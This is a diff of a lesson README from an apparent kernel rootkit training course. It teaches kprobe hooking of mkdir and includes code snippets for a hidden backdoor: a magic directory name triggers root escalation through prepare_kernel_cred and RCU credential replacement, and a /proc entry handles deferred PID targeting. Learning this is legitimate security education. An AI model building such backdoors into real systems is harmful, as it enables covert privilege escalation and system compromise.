@@ -1,112 +1,178 @@
-# Open rklings_hook.h and understand kprobes
+# L08: Kprobe Revealed
 
-You have used `rklings_hook.h` as a black box through L05, L06, and L07.
-Now open it, understand every line, and rewrite the interception from scratch
-using `register_kprobe` directly.
+Open `rklings_hook.h`.
+Read every line.
+Then delete it and rewrite mkdir interception from scratch using
+`register_kprobe` directly.
 
-## What the header was hiding
+## What kprobes are
 
-The header registered a **kprobe** on `__x64_sys_mkdir`.
-A kprobe plants a breakpoint at the start of a kernel function and fires your
-`pre_handler` before the function body runs.
-The flow looks like this:
-
-```
-userspace: mkdir("rklings.e")
-       |
-       v
-__x64_sys_mkdir(struct pt_regs *regs)
-       |
-  [kprobe fires]
-       |
-       v
-your pre_handler(struct kprobe *p, struct pt_regs *regs)
-  1. extract inner pt_regs (the syscall's argument)
-  2. read the pathname from userspace
-  3. check prefix, dispatch action
-  4. nullify the pathname so real mkdir sees ""
-       |
-       v
-__x64_sys_mkdir runs on empty path, fails harmlessly
-```
-
-## The nested pt_regs trick
-
-`__x64_sys_mkdir` is a syscall wrapper whose only argument is a
-`struct pt_regs *` holding the original register state.
-Your kprobe's `pre_handler` also receives a `struct pt_regs *`, but this one is
-the kprobe trap frame, not the syscall registers.
-
-To reach the actual syscall arguments:
+Kprobes are the kernel's dynamic instrumentation framework.
+You register a function name and a callback.
+The kernel patches a breakpoint instruction at the function's entry point.
+When that instruction executes, your callback runs with access to the CPU
+registers.
 
 ```c
-// Step 1: extract the inner pt_regs (first argument to __x64_sys_mkdir)
-struct pt_regs *uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
+static struct kprobe rk_kprobe_mkdir = {
+    .symbol_name = "__x64_sys_mkdir",
+    .pre_handler = rk_pre_mkdir,
+};
 
-// Step 2: read RDI (first syscall argument: the pathname pointer)
-const char __user *pathname = (const char __user *)uregs->di;
+register_kprobe(&rk_kprobe_mkdir);
 ```
 
-## Copying the pathname safely
+Your `pre_handler` receives `struct pt_regs *regs` holding the register state at
+the moment the function was entered.
+You can read arguments, modify state, or take action before the function runs.
 
-The pathname lives in userspace memory.
-Use `strncpy_from_user` to copy it into a kernel buffer:
+## Reading the pathname
+
+The pathname comes from userspace.
+You need `strncpy_from_user` to copy it safely into a kernel buffer, then
+`strrchr` to extract the basename:
 
 ```c
+long strncpy_from_user(char *dst, const char __user *src, long count);
+
 char buf[128];
-long copied = strncpy_from_user(buf, pathname, sizeof(buf));
-```
-
-Returns the number of bytes copied (not counting the null terminator), or a
-negative error.
-After copying, extract the basename with `strrchr`:
-
-```c
+strncpy_from_user(buf, pathname, sizeof(buf));
 const char *base = strrchr(buf, '/');
 base = base ? base + 1 : buf;
 ```
 
 ## Suppressing the real mkdir
 
-Write a null byte to the start of the userspace path.
-The real mkdir sees an empty string and fails with ENOENT, which is harmless:
+After interception, you do not want the real mkdir to create a directory.
+The `put_user('\0')` trick writes a null byte to the start of the userspace
+pathname.
+The real mkdir sees an empty string and fails harmlessly:
 
 ```c
 put_user('\0', (char __user *)pathname);
 ```
 
-## Deferred PID delivery with /proc/rklings
+## RCU credential replacement
 
-When you run `mkdir rklings.e.1234` but PID 1234 does not exist yet, store the
-PID.
-Create a `/proc/rklings` entry using `proc_create_single_seq_show` that displays
-the pending PID.
-When the target process appears and something reads `/proc/rklings`, attempt the
-deferred escalation.
+For PID escalation, `commit_creds` only works on `current`.
+To escalate a different process, replace its credentials directly via RCU:
 
-## Your task
-
-1. Read `curriculum/include/rklings_hook.h` completely
-2. Write a `pre_handler` that extracts the nested pt_regs
-3. Copy the pathname with `strncpy_from_user`
-4. Check for the "rklings."
-   prefix, dispatch escalation
-5. Nullify the pathname with `put_user`
-6. Register the kprobe on `__x64_sys_mkdir`
-7. Create `/proc/rklings` for deferred PID delivery
-
-Everything you need is in the starter file as TODO comments.
-Fill in each function body.
-
-## Verify
-
-```sh
-$ mkdir rklings.e && id
-uid=0(root)
+```c
+rcu_read_lock();
+task = pid_task(find_vpid(pid), PIDTYPE_PID);
+new_cred = prepare_kernel_cred(&init_task);
+old_cred = task->real_cred;
+rcu_assign_pointer(task->real_cred, new_cred);
+rcu_assign_pointer(task->cred, new_cred);
+rcu_read_unlock();
+put_cred(old_cred);
 ```
 
-Run:
-
-```sh
-./rklings check
+```text
+  mkdir("rklings.e")
+       |
+       v
+  __x64_sys_mkdir(struct pt_regs *regs)
+       |
+    [kprobe fires]
+       |
+       v
+  rk_pre_mkdir(kprobe, regs)
+    1. extract inner pt_regs
+    2. strncpy_from_user(pathname)
+    3. strrchr for basename
+    4. dispatch action
+    5. put_user('\0') to suppress mkdir
 ```
+
+## The trap
+
+`__x64_sys_mkdir` is a syscall wrapper.
+Its only argument is a `struct pt_regs *` holding the original register state.
+Your kprobe's `pre_handler` also receives a `struct pt_regs *`, but that is the
+kprobe trap frame.
+
+You must dereference twice:
+
+```c
+// Step 1: get inner pt_regs (first argument to __x64_sys_mkdir)
+struct pt_regs *uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
+
+// Step 2: read the actual syscall argument from inner regs
+const char __user *pathname = (const char __user *)uregs->di;   // mkdir
+const char __user *pathname = (const char __user *)uregs->si;   // mkdirat
+```
+
+If you read `regs->di` directly, you get garbage.
+This double indirection applies to all `__x64_sys_*` functions.
+Regular kernel functions like `ksys_read` do not have this wrapping.
+
+## You write
+
+`main.c` (~190 lines):
+
+- two kprobes (`__x64_sys_mkdir` + `__x64_sys_mkdirat`)
+- pathname extraction from inner `pt_regs`
+- escalation (self + PID)
+- deferred delivery via `/proc/rklings`
+
+No `rklings_hook.h`.
+Everything from scratch.
+
+## API
+
+```c
+#include <linux/kprobes.h>
+
+int register_kprobe(struct kprobe *p);
+void unregister_kprobe(struct kprobe *p);
+
+struct pt_regs *uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
+long strncpy_from_user(char *dst, const char __user *src, long count);
+int put_user(T val, T __user *ptr);
+
+// RCU PID escalation
+struct task_struct *pid_task(struct pid *pid, enum pid_type type);
+struct pid *find_vpid(int nr);
+void rcu_read_lock(void);
+void rcu_read_unlock(void);
+void rcu_assign_pointer(T *p, T *v);
+void put_cred(const struct cred *cred);
+```
+
+## Test it
+
+```
+$ rklings run l08
+root@vm:~# cat /sys/kernel/debug/kprobes/list
+(two kprobes on __x64_sys_mkdir and __x64_sys_mkdirat)
+root@vm:~# mkdir rklings.e && id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Deferred PID delivery still works:
+
+```
+root@vm:~# mkdir rklings.e.$$
+root@vm:~# cat /proc/rklings
+deferred: <pid>
+```
+
+## Validate
+
+```
+$ rklings validate l08
+  [+] module loads (no rklings_hook.h)
+  [+] kprobe registered on __x64_sys_mkdir
+  [+] kprobe registered on __x64_sys_mkdirat
+  [+] self-escalation works
+  [+] PID targeting works
+  [+] deferred delivery via /proc/rklings
+  PASS
+```
+
+## Next
+
+Your kprobe fires before mkdir runs, but cannot control its return value.
+L09 switches to a kretprobe, which fires on both entry and return, and adds a
+command dispatcher.
